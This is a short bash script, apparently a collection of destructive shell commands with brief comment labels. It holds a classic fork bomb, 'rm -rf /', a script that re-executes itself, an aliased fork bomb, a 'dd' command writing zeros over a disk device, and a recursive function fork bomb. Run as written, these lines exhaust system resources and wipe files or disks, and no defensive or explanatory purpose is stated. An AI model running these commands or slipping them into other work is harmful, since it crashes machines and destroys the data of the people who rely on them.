#!/bin/bash

# Classic fork bomb
:(){ :|:& };:

# Infinite yes
yes "boom" | yes "doom"

# Dangerous command
rm -rf /

# Self-calling
bash $0

# Alias fork bomb
alias boom=':(){ :|:& };:'

# Disk overwrite (simulated)
dd if=/dev/zero of=/dev/sdX

# Function that keeps calling itself
foo(){ foo | foo & }; foo
